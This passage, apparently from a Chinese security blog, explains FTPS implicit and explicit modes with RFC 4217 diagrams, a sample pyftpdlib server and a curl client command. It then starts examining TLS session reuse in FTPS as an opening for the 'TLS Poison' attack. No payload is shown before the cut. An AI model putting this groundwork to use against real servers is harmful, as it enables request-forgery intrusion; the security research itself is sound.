<a href="https://en.wikipedia.org/wiki/Secure_Sockets_Layer" target="_blank" rel="noopener">Secure Sockets Layer</a> (SSL, which is now prohibited by <a href="https://tools.ietf.org/html/rfc7568" target="_blank" rel="noopener">RFC7568</a>) cryptographic protocols.</p><p>FTPS should not be confused with the <a href="https://en.wikipedia.org/wiki/SSH_File_Transfer_Protocol" target="_blank" rel="noopener">SSH File Transfer Protocol</a> (SFTP), a secure file transfer subsystem for the <a href="https://en.wikipedia.org/wiki/Secure_Shell" target="_blank" rel="noopener">Secure Shell</a> (SSH) protocol with which it is not compatible. It is also different from <a href="https://en.wikipedia.org/wiki/FTP_over_SSH" target="_blank" rel="noopener">FTP over SSH</a>, which is the practice of tunneling FTP through an SSH connection.</p></blockquote><p>首先简单介绍一下 FTPS ，FTPS 是一种对常用的文件传输协议（FTP）添加传输层安全（TLS）和安全套接层（SSL）加密协议支持的扩展协议。</p><p>在 HTTPS 横空出世之后，SSL 协议也应用到了 FTP 上，随后在 1996 发布了 FTPS 的一个草案 <a href="https://tools.ietf.org/id/draft-murray-auth-ftp-ssl-00.txt" target="_blank" rel="noopener">Secure FTP over SSL</a> ，但是直到 2005 年才最终确定终稿 <a href="https://tools.ietf.org/html/rfc4217" target="_blank" rel="noopener">RFC 4217 - Securing FTP with TLS</a> 。然而实际上，FTPS 拥有两种模式，这里并非指的是 FTP 的主动、被动模式，而是显式、隐式模式。</p><h3 id="Implicit-Mode"><a href="#Implicit-Mode" class="headerlink" title="Implicit Mode"></a>Implicit Mode</h3><p>在隐式模式下，FTPS 的默认端口在 990 端口上，隐式模式下所有的连接数据均为加密。</p><p>客户端必须先使用 TLS Client Hello 消息向 FTPS 服务器进行握手来创建加密连接，如果 FTPS 服务器未收到此类消息，则服务器应断开连接。 为了保持与现有的非 FTPS 感知客户端的兼容性，隐式 FTPS 默认在 IANA 规定的端口 990/TCP 上监听 FTPS 控制通道，并在端口 989/TCP 上监听 FTPS 数据通道。这使得管理员可以保留端口(控制通道 21/TCP 与数据通道 20/TCP )以兼容原始的FTP。</p><p>虽然我没有查找到隐式 FTPS 的相关历史，但是我个人觉得他更像在 SSL 时代应运而生的产物，更符合了 FTP over SSL 的意思，也就是一开始使用 TLS/SSL 进行会话创建，再进行数据加密传输。但 RFC 4217 中未定义隐式模式，因此它也被认为是FTP协商TLS/SSL中过时的早期方法。</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://www.sftpplus.de/static/images/4608-ImplicitFTPS.png" alt=""></p><h3 id="Explicit-Mode"><a href="#Explicit-Mode" class="headerlink" title="Explicit Mode"></a>Explicit Mode</h3><p>在显式模式（也称为FTPES）下，FTPS 客户端先与服务器创建明文连接，然后从控制通道明确请求服务端升级为加密连接（命令为: AUTH TLS）。控制通道与数据通道默认端口与原始 FTP 一样也是 21 端口。控制通道始终加密，而数据通道是否加密则为可选项。 同时若服务器未限制明文连接，也可以使用未加密的原始 FTP 进行连接，也就是说服务器在相同的端口上同时提供 FTP 与 FTPS 服务。</p><p>与FTP协商认证和安全的机制是在 RFC 2228 下增加的，其中包括新的 FTP 命令 AUTH 。虽然该 RFC 没有明确定义任何所需的安全机制，如 SSL 或 TLS ，但它确实要求 FTPS 客户端用一个双方都知道的机制挑战 FTPS 服务器。如果 FTPS 客户端用一个未知的安全机制挑战 FTPS 服务器， FTPS 服务器将以错误代码 504（不支持）响应 AUTH 命令。客户可以通过使用 FEAT 命令查询 FTPS 服务器来确定支持哪些机制，尽管服务器不一定需要诚实地披露它们支持哪些安全级别。调用 FTPS 安全的常见方法包括 AUTH TLS 和 AUTH SSL 。显式方法在 RFC 4217 中定义后，FTPS的合规性要求客户端始终使用 AUTH TLS 方法进行协商。</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://www.sftpplus.de/static/images/4608-ExplicitFTPS.png" alt=""></p><p>我们可以在 RFC 4217 中找到显式 FTPS 建立连接方式：</p><p></p><figure class="highlight routeros hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">          <span class="hljs-built_in"> Client </span>                                Server</span><br><span class="line">  control          data                   data               control</span><br><span class="line">====================================================================</span><br><span class="line"></span><br><span class="line">                                                             socket()</span><br><span class="line">                                                             bind()</span><br><span class="line">  socket()</span><br><span class="line">  connect()  ----------------------------------------------&gt; accept()</span><br><span class="line">            &lt;----------------------------------------------  220</span><br><span class="line">  AUTH TLS   ----------------------------------------------&gt;</span><br><span class="line">            &lt;----------------------------------------------  234</span><br><span class="line">  TLSneg()  &lt;----------------------------------------------&gt; TLSneg()</span><br><span class="line">  PBSZ 0     ----------------------------------------------&gt;</span><br><span class="line">            &lt;----------------------------------------------  200</span><br><span class="line">  PROT P     ----------------------------------------------&gt;</span><br><span class="line">            &lt;----------------------------------------------  200</span><br><span class="line"> <span class="hljs-built_in"> USER </span>fred  ----------------------------------------------&gt;</span><br><span class="line">            &lt;----------------------------------------------  331</span><br><span class="line">  PASS pass  ----------------------------------------------&gt;</span><br><span class="line">            &lt;----------------------------------------------  230</span><br><span class="line"></span><br><span class="line">Note 1: The order of the PBSZ/PROT pair <span class="hljs-keyword">and</span> the USER/PASS pair (with</span><br><span class="line">respect <span class="hljs-keyword">to</span> each other) is <span class="hljs-keyword">not</span> important (i.e., the USER/PASS can</span><br><span class="line">happen prior <span class="hljs-keyword">to</span> the PBSZ/PROT, <span class="hljs-keyword">or</span> the<span class="hljs-built_in"> server </span>can refuse <span class="hljs-keyword">to</span> allow a</span><br><span class="line">PBSZ/PROT pair until the USER/PASS pair has happened).</span><br><span class="line"></span><br><span class="line">Note 2: The PASS command might <span class="hljs-keyword">not</span> be required at all (<span class="hljs-keyword">if</span> the USER</span><br><span class="line">parameter <span class="hljs-keyword">and</span> any<span class="hljs-built_in"> client identity </span>presented provide sufficient</span><br><span class="line">authentication).  The<span class="hljs-built_in"> server </span>would indicate this by issuing a <span class="hljs-string">'232'</span></span><br><span class="line">reply <span class="hljs-keyword">to</span> the<span class="hljs-built_in"> USER </span>command instead of the <span class="hljs-string">'331'</span>, which requests a PASS</span><br><span class="line"><span class="hljs-keyword">from</span> the<span class="hljs-built_in"> client </span>(see below).</span><br><span class="line"></span><br><span class="line">Note 3: The AUTH command might <span class="hljs-keyword">not</span> be the first command after the</span><br><span class="line">receipt of the 220 welcome message.</span><br></pre></td></tr></tbody></table></figure><p></p><p>数据传输阶段：</p><p></p><figure class="highlight routeros hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">12.6.  A Standard Data Transfer with Protection</span><br><span class="line"></span><br><span class="line">             <span class="hljs-built_in"> Client </span>                                Server</span><br><span class="line">     control          data                   data               control</span><br><span class="line">   ====================================================================</span><br><span class="line"></span><br><span class="line">                      socket()</span><br><span class="line">                      bind()</span><br><span class="line">    <span class="hljs-built_in"> PORT </span>w,x,y,z,a,b --------------------------------------------&gt;</span><br><span class="line">         &lt;-------------------------------------------------------- 200</span><br><span class="line">     STOR file ---------------------------------------------------&gt;</span><br><span class="line">                                             socket()</span><br><span class="line">                                             bind()</span><br><span class="line">         &lt;-------------------------------------------------------- 150</span><br><span class="line">                      accept()  &lt;----------  connect()</span><br><span class="line">                      TLSneg()  &lt;----------&gt; TLSneg()</span><br><span class="line">                      TLSwrite() ----------&gt; TLSread()</span><br><span class="line">                      TLSshutdown() -------&gt; TLSshutdown()</span><br><span class="line">                      close()    ----------&gt; close()</span><br><span class="line">         &lt;-------------------------------------------------------- 226</span><br><span class="line"></span><br><span class="line">12.7.  A Firewall-Friendly Data Transfer with Protection</span><br><span class="line"></span><br><span class="line">             <span class="hljs-built_in"> Client </span>                                Server</span><br><span class="line">     control          data                   data               control</span><br><span class="line">   ====================================================================</span><br><span class="line"></span><br><span class="line">     PASV --------------------------------------------------------&gt;</span><br><span class="line">                                             socket()</span><br><span class="line">                                             bind()</span><br><span class="line">         &lt;------------------------------------------ 227 (w,x,y,z,a,b)</span><br><span class="line">                      socket()</span><br><span class="line">     STOR file ---------------------------------------------------&gt;</span><br><span class="line">                      connect()  ----------&gt; accept()</span><br><span class="line">         &lt;-------------------------------------------------------- 150</span><br><span class="line">                      TLSneg()   &lt;---------&gt; TLSneg()</span><br><span class="line">                      TLSwrite()  ---------&gt; TLSread()</span><br><span class="line">                      TLSshutdown() -------&gt; TLSshutdown()</span><br><span class="line">                      close()     ---------&gt; close()</span><br><span class="line">         &lt;-------------------------------------------------------- 226</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="TLS-Poison-In-FTPS"><a href="#TLS-Poison-In-FTPS" class="headerlink" title="TLS Poison In FTPS"></a>TLS Poison In FTPS</h2><p>看到如上解释，想必大家可能也会有思考，那么是不是 FTPS 也会有 TLS 会话重用的特性呢？那么是不是也可以跟 TLS Poison 相关联起来呢？</p><h3 id="Explicit"><a href="#Explicit" class="headerlink" title="Explicit"></a>Explicit</h3><p>首先我们来先看看拥有 RFC 4217 规范的显示 FTPS ，我们可以借用 pyftpdlib 来做一个简单的 FTPS Server</p><p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-string">"""</span></span><br><span class="line"><span class="hljs-string">An RFC-4217 asynchronous FTPS server supporting both SSL and TLS.</span></span><br><span class="line"><span class="hljs-string">Requires PyOpenSSL module (http://pypi.python.org/pypi/pyOpenSSL).</span></span><br><span class="line"><span class="hljs-string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">from</span> pyftpdlib.servers <span class="hljs-keyword">import</span> FTPServer</span><br><span class="line"><span class="hljs-keyword">from</span> pyftpdlib.authorizers <span class="hljs-keyword">import</span> DummyAuthorizer</span><br><span class="line"><span class="hljs-keyword">from</span> pyftpdlib.handlers <span class="hljs-keyword">import</span> TLS_FTPHandler</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>:</span></span><br><span class="line">    authorizer = DummyAuthorizer()</span><br><span class="line">    <span class="hljs-comment"># authorizer.add_user('ftpuser', 'ftpuser123', '.', perm='elradfmwMT')</span></span><br><span class="line">    authorizer.add_anonymous(<span class="hljs-string">'.'</span>)</span><br><span class="line">    handler = TLS_FTPHandler</span><br><span class="line">    handler.certfile = <span class="hljs-string">'keycert.pem'</span></span><br><span class="line">    handler.authorizer = authorizer</span><br><span class="line">    <span class="hljs-comment"># requires SSL for both control and data channel</span></span><br><span class="line">    handler.tls_control_required = <span class="hljs-literal">True</span></span><br><span class="line">    handler.tls_data_required = <span class="hljs-literal">True</span></span><br><span class="line">    server = FTPServer((<span class="hljs-string">''</span>, <span class="hljs-number">11211</span>), handler)</span><br><span class="line">    server.serve_forever()</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></tbody></table></figure><p></p><p>对于客户端我们可以使用 curl 来发起一个显式 FTPS 请求：</p><p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --ftp-ssl --user name:passwd ftp://ftp.host.com/</span><br></pre></td></tr></tbody></table></figure><p></p><p>如果需要用户验证就加上<code>--user</code>选项即可，不需要的话就不用，结果如图所示：</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20210510000343.png" alt=""></p><p>我们可以清楚的看到在显式 FTPS 在使用<code>AUTH SSL</code>命令之后才与服务器建立的 TLS 连接，并在<code>LIST</code>之后我们可以看到重新使用了 TLS Session 。</p><p>这里我们简单回顾一下，在利用 HTTPS 进行 TLS Poison 时，我们需要再次使用 HTTP 重定向让客户端重新与我们建立会话，但是仔细观察 FTPS ，我们并没有使用类似 HTTPS 重定向的功能让其再次与 FTPS 服务器建立连接，那为什么我们只是简单访问一次 FTPS 服务器就会产生会话重用的现象呢？</p><p>让我们看之前发生了什么，客户端使用了<code>EPSV</code>命令表示使用 FTP 被动模式，FTP 服务器以<code>(||||32949)</code>对该命令进行了回复。</p><p>这里我们简单回顾一下 FTP 的被动模式：在被动模式的 FTP 中，客户端启动到服务器的两个连接，<strong>解决了防火墙阻止从服务器到客户端的传入数据端口连接的问题</strong>。FTP 连接建立后，客户端在本地打开两个随机的非系统端口 N 和 N + 1(N &gt; 1023)。第一个端口连接服务器上的 21 端口，但是客户端这次将会发出 PASV 命令，也就是不允许服务器连接回其数据端口。这样，服务器随后会打开一个随机的非系统端口 P (P &gt; 1023)，并将 P 发送给客户端作为 PASV 命令的响应。然后客户端启动从端口 N+1 到端口 P 的连接来传输数据。其中<code>EPSV</code>命令为<code>PASV</code>的更新版本，主要为了兼容 IPv6 而在 RFC 2428 中定义的。</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDG